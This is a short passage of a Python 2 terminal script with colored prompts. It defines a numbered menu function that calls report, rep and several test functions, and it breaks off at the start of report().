def pilih_fighter():
	peak = raw_input("\n\033[1;97mEnter Number ---- \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_fighter()
	elif peak =="1":
		report()
        elif peak =="2":
	        rep()
        elif peak =="3":
                test1()
        elif peak =="4":
	        test2()
        elif peak =="5":
	        test3()
        elif peak =="6":
	        test4()
	elif peak =="0":
		menu()
def report():
    try:
        os.system('clear')
        print logo3
